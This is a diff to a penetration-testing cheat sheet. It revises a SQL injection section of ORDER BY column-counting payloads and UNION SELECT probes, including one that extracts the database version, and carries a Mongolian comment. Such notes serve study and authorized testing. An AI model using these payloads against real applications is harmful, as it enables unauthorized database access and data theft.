@@ -30,16 +30,16 @@ nikto -h $HOST
 ##### SQL Injection
 
 ```
-' order by 1 --
 ' order by 1 -- -
-' order by 2 --
-' order by 3 --
-' order by 4 --
-' order by 5 --
-' order by 6 --
-' order by 7 --
-' order by 8 --
-' order by 9 --
+' order by 1 -- -
+' order by 2 -- -
+' order by 3 -- -
+' order by 4 -- -
+' order by 5 -- - 
+' order by 6 -- -
+' order by 7 -- -
+' order by 8 -- -
+' order by 9 -- -
 ' union select 1,2,3,4,5,6,7,8 -- - 
 ( Хэрвээ 4-р хэрэглэгчээр нэвтрэх юм бол )
 ' union select 1,2,3,@@version,5,6,7,8 -- -
